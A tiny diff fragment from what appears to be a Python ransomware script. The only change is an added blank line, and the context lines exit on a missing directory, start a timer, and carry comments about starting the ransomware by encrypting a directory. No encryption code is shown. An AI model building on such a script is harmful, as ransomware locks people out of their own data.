@@ -32,6 +32,7 @@ if not os.path.exists(directory):
     sys.exit(1)
 
 # start the timer and start the ransomware
+
 start = time.time()
 
 # start the ransomware by encrypting the directory
